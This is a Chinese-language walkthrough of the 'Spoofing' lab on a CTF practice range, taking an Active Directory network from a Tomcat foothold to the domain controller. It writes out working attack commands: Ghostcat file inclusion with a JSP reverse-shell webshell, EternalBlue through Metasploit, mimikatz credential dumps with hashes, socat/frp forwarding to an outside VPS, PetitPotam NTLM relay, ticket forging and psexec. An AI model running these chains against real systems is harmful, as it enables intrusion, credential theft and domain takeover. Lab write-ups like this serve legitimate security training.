# 春秋云境Spoofing

## flag1

首先用fscan扫一下

![屏幕截图 2026-01-02 152327](D:\Pictures\Spoofing\屏幕截图 2026-01-02 152327.png)

访问可以发现一个直接登录的后台管理，按照习惯可以点点找找有没有漏洞利用点，还可以用dirsearch扫一下目录

```
[15:24:48] 200 -   114B - /404.html
[15:24:48] 200 -    7KB - /;admin/
[15:24:48] 200 -    7KB - /;login/
[15:24:48] 400 -   795B - /\..\..\..\..\..\..\..\..\..\etc\passwd
[15:24:48] 200 -    7KB - /;json/
[15:24:49] 400 -   795B - /a%5c.aspx
[15:24:57] 200 -    7KB - /console.html
[15:24:58] 302 -     0B - /css  ->  /css/
[15:24:58] 302 -     0B - /data  ->  /data/
[15:24:59] 404 -   729B - /docs/_build/
[15:24:59] 404 -   746B - /docs/html/admin/ch01.html
[15:24:59] 404 -   732B - /docs/CHANGELOG.html
[15:24:59] 404 -   731B - /docs/changelog.txt
[15:24:59] 404 -   749B - /docs/html/admin/ch01s04.html
[15:24:59] 404 -   733B - /docs/export-demo.xml
[15:24:59] 302 -     0B - /docs  ->  /docs/
[15:24:59] 404 -   749B - /docs/html/admin/ch03s07.html
[15:24:59] 404 -   747B - /docs/html/admin/index.html
[15:24:59] 404 -   750B - /docs/html/developer/ch02.html
[15:24:59] 404 -   753B - /docs/html/developer/ch03s15.html
[15:24:59] 404 -   737B - /docs/html/index.html
[15:24:59] 200 -   17KB - /docs/
[15:24:59] 404 -   730B - /docs/updating.txt
[15:24:59] 404 -   733B - /docs/maintenance.txt
[15:24:59] 404 -   730B - /docs/swagger.json
[15:24:59] 302 -     0B - /download  ->  /download/
[15:24:59] 200 -   132B - /download/
[15:24:59] 404 -   781B - /examples/jsp/%252e%252e/%252e%252e/manager/html/
[15:24:59] 302 -     0B - /examples  ->  /examples/
[15:24:59] 200 -    1KB - /examples/
[15:24:59] 404 -   746B - /examples/servlet/SnoopServlet
[15:24:59] 200 -    6KB - /examples/servlets/index.html
[15:24:59] 200 -    1KB - /examples/websocket/index.xhtml
[15:24:59] 200 -   658B - /examples/servlets/servlet/CookieExample
[15:24:59] 200 -  1009B - /examples/servlets/servlet/RequestHeaderExample
[15:24:59] 200 -   14KB - /examples/jsp/index.html
[15:25:00] 200 -   688B - /examples/jsp/snp/snoop.jsp
[15:25:01] 403 -    3KB - /host-manager/html
[15:25:01] 403 -    3KB - /host-manager/
[15:25:01] 302 -     0B - /images  ->  /images/
[15:25:02] 200 -    7KB - /index.html
[15:25:02] 302 -     0B - /js  ->  /js/
[15:25:03] 302 -     0B - /lib  ->  /lib/
[15:25:04] 302 -     0B - /manager  ->  /manager/
[15:25:04] 403 -    3KB - /manager/
[15:25:04] 403 -    3KB - /manager/admin.asp
[15:25:04] 403 -    3KB - /manager/html/
[15:25:04] 403 -    3KB - /manager/html
[15:25:04] 403 -    3KB - /manager/jmxproxy
[15:25:04] 403 -    3KB - /manager/jmxproxy/?get=java.lang:type=Memory&att=HeapMemoryUsage
[15:25:04] 403 -    3KB - /manager/jmxproxy/?get=BEANNAME&att=MYATTRIBUTE&key=MYKEY
[15:25:04] 403 -    3KB - /manager/jmxproxy/?invoke=BEANNAME&op=METHODNAME&ps=COMMASEPARATEDPARAMETERS
[15:25:04] 403 -    3KB - /manager/jmxproxy/?invoke=Catalina%3Atype%3DService&op=findConnectors&ps=
[15:25:04] 403 -    3KB - /manager/jmxproxy/?set=BEANNAME&att=MYATTRIBUTE&val=NEWVALUE
[15:25:04] 403 -    3KB - /manager/jmxproxy/?qry=STUFF
[15:25:04] 403 -    3KB - /manager/login
[15:25:04] 403 -    3KB - /manager/login.asp
[15:25:04] 403 -    3KB - /manager/status/all
[15:25:04] 403 -    3KB - /manager/VERSION
[15:25:12] 403 -     0B - /upload
[15:25:12] 403 -     0B - /upload/2.php
[15:25:12] 403 -     0B - /upload/1.php
[15:25:12] 403 -     0B - /upload/loginIxje.php
[15:25:12] 403 -     0B - /upload/test.txt
[15:25:12] 403 -     0B - /upload/b_user.csv
[15:25:12] 403 -     0B - /upload/test.php
[15:25:12] 403 -     0B - /upload/upload.php
[15:25:12] 403 -     0B - /upload/b_user.xls
[15:25:12] 403 -     0B - /upload/
[15:25:12] 200 -    9KB - /user.html
```

访问/docs可以知道这是一个Tomcat 9.0.30,一个非常微妙的版本，可以打CVE-2020-1938（AJP漏洞），因为fscan扫出来8009端口对外开放，所有可以进行漏洞利用

复习一下tomcat的框架

```
tomcat/
└── webapps/
    └── myshop/               
        ├── index.html
        ├── login.jsp
        ├── WEB-INF/          ← ⚠️ 非常重要的隐藏目录
        │   ├── web.xml
        │   ├── classes/
        │   └── lib/
        └── upload/
```

使用ajpshooter，ajpshooter具有两个功能

任意文件读

```Plain
python ajpShooter.py http://39.98.125.91:8080 8009  /WEB-INF/web.xml read
```

恶意文件包含

```Plain
python ajpShooter.py http://39.98.125.91:8080 8009 /upload/356aefc49ff23dd7de8998158421d8e2/20241016105901376.txt eval（以jsp方式包含执行）
```

因为没找到上传点，所以先读一下web.xml,发现了一个/UploadServlet的上传接口，上传一个恶意txt文件

```
<% java.io.InputStream in = Runtime.getRuntime().exec("bash -c {echo,***(你自己的payload)}|{base64,-d}|{bash,-i}").getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print("<pre>"); while((a=in.read(b))!=-1){ out.println(new String(b));  out.print("</pre>"); } %>
```

返回路径

/upload/867c30446fc9f8b06158d80f264150ac/20260102035819613.txt

在vps上开启监听然后包含文件即可

在root下发现flag![屏幕截图 2026-01-02 160327](D:\Pictures\Spoofing\屏幕截图 2026-01-02 160327.png)

## flag2

上传frpc和fscan

```
./fscan -h 172.22.11.0/24
```

```
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
(icmp) Target 172.22.11.76    is alive
(icmp) Target 172.22.11.6     is alive
(icmp) Target 172.22.11.26    is alive
(icmp) Target 172.22.11.45    is alive
[*] Icmp alive hosts len is: 4
172.22.11.26:139 open
172.22.11.6:139 open
172.22.11.26:135 open
172.22.11.6:135 open
172.22.11.76:22 open
172.22.11.45:139 open
172.22.11.45:135 open
172.22.11.26:445 open
172.22.11.45:445 open
172.22.11.6:445 open
172.22.11.6:88 open
172.22.11.76:8080 open
172.22.11.76:8009 open
[*] alive ports len is: 13
start vulscan
[*] NetInfo 
[*]172.22.11.6
   [->]XIAORANG-DC
   [->]172.22.11.6
[*] NetInfo 
[*]172.22.11.26
   [->]XR-LCM3AE8B
   [->]172.22.11.26
[+] MS17-010 172.22.11.45       (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)
[*] NetBios 172.22.11.6     [+] DC:XIAORANG\XIAORANG-DC    
[*] NetBios 172.22.11.26    XIAORANG\XR-LCM3AE8B          
[*] NetBios 172.22.11.45    XR-DESKTOP.xiaorang.lab             Windows Server 2008 R2 Enterprise 7601 Service Pack 1
[*] WebTitle http://172.22.11.76:8080  code:200 len:7091   title:后台管理
```

直接出了永恒之蓝，可以用msf打

```
proxychains4 msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set payload  payload/windows/x64/meterpreter/bind_tcp
set rhosts 172.22.11.45
run
```

然后直接读取flag

![屏幕截图 2026-01-02 163740](D:\Pictures\Spoofing\屏幕截图 2026-01-02 163740.png)

## flag3

用kiwi模块导出从**当前主机内存中**提取所有可用的凭证信息

```
load kiwi

creds_all
```

抓到机器账户和yangmei的哈希

```
Username     Domain    NTLM                       SHA1

--------     ------    ----                       ----

XR-DESKTOP$  XIAORANG  2234122abc228cbe0dd7a82e9  5d67c2cdd1727a4d4c984c908
                       62a41b2                    fdf88d0d8b21b4a
yangmei      XIAORANG  25e42ef4cc0ab6a8ff9e3edbb  6b2838f81b57faed5d860adaf
                       da91841                    9401b0edb269a6f
```

```
crackmapexec smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -d xiaorang.lab -M Webdav 2>/dev/null
```

![屏幕截图 2026-01-07 143757](D:\Pictures\Spoofing\屏幕截图 2026-01-07 143757.png)

可以看见172.22.11.26开启了webclient服务，因为这里已经有了一个域用户凭据，所以考虑以下流程

1. 用已知凭据（如`PetitPotam`）**主动触发**目标WebClient访问你的恶意WebDAV。
2. 目标自动发送高权限NTLM Hash给你。



现在172.22.11.26能直接访问到172.22.11.76,我们需要打通其和kali

在开始的隧道的基础上，在172.22.11.26上执行socat tcp-listen:80,reuseaddr,fork tcp:47.109.157.54:8848，把所有80端口的流量转发到47.109.157.54:8848

vps上运行./frps -c ./frps.ini

```
[common]
bind_port = 7099
 
[tcp_1200]
type = tcp
local_ip = 127.0.0.1 
local_port = 8848
```

在kali里运行

```
[common]
server_addr = 47.109.157.54
server_port = 7099
 
[plugin_socks6]
type = tcp
remote_port = 8848
local_port = 80
local_ip = 127.0.0.1
```

这样就成功地使得webclient访问172.22.11.76得流量发到kali

在kali里启动 ntlmrelayx 监听 LDAP 中继（设置 RBCD）

```
impacket-ntlmrelayx -t ldap://172.22.11.6 --no-dump --no-da --no-acl --escalate-user 'xr-desktop$' --delegate-access
```

![屏幕截图 2026-01-21 165145](D:\Pictures\Spoofing\屏幕截图 2026-01-21 165145.png)

接着让172.22.11.26访问172.22.11.76，触发认证

```
python PetitPotam.py -u yangmei -p xrihGHgoNZQ -d xiaorang.lab ubuntu@80/webdav 172.22.11.26
```

然后用抓到得哈希申请SY票据/

```
impacket-getST -spn cifs/XR-LCM3AE8B.xiaorang.lab -impersonate administrator -hashes :2234122abc228cbe0dd7a82e962a41b2      xiaorang.lab/XR-Desktop\$ -dc-ip 172.22.11.6
```

然后导入票据administrator@cifs_XR-LCM3AE8B.xiaorang.lab@XIAORANG.LAB

```
export KRB5CCNAME=administrator@cifs_XR-LCM3AE8B.xiaorang.lab@XIAORANG.LAB
```

最后就可以用psexec无密码登录,成功获取system得到flag

```
python /usr/share/doc/python3-impacket/examples/psexec.py xiaorang.lab/administrator@XR-LCM3AE8B.xiaorang.lab -k -no-pass -target-ip 172.22.11.26 -codec gbk
```

![屏幕截图 2026-01-21 170353](D:\Pictures\Spoofing\屏幕截图 2026-01-21 170353.png)

## flag04

```
net localgroup /domain
```

![屏幕截图 2026-01-21 170521](D:\Pictures\Spoofing\屏幕截图 2026-01-21 170521.png)

可以添加一个新用户，创建一个新的管理员账户

```
privilege::debug
sekurlsa::logonpasswords
```

RDP连172.22.11.26 ,用猕猴桃管理员运行成功找到一个域内用户zhanghui

```
privilege::debug
sekurlsa::logonpasswords
```



```
Authentication Id : 0 ; 827074 (00000000:000c9ec2)
Session           : RemoteInteractive from 2
User Name         : zhanghui
Domain            : XIAORANG
Logon Server      : XIAORANG-DC
Logon Time        : 2026/1/21 16:17:08
SID               : S-1-5-21-3598443049-773813974-2432140268-1133
        msv :
         [00000003] Primary
         * Username : zhanghui
         * Domain   : XIAORANG
         * NTLM     : 1232126b24cdf8c9bd2f788a9d7c7ed1
         * SHA1     : f3b66ff457185cdf5df6d0a085dd8935e226ba65
         * DPAPI    : 4bfe751ae03dc1517cfb688adc506154
        tspkg :
        wdigest :
         * Username : zhanghui
         * Domain   : XIAORANG
         * Password : (null)
        kerberos :
         * Username : zhanghui
         * Domain   : XIAORANG.LAB
         * Password : (null)
        ssp :
        credman :
```

最后要打域控拿flag4,zhanghui可以创建域账户，可以打nopac

![屏幕截图 2026-01-21 172411](D:\Pictures\Spoofing\屏幕截图 2026-01-21 172411.png)

最后老位置找到flag04
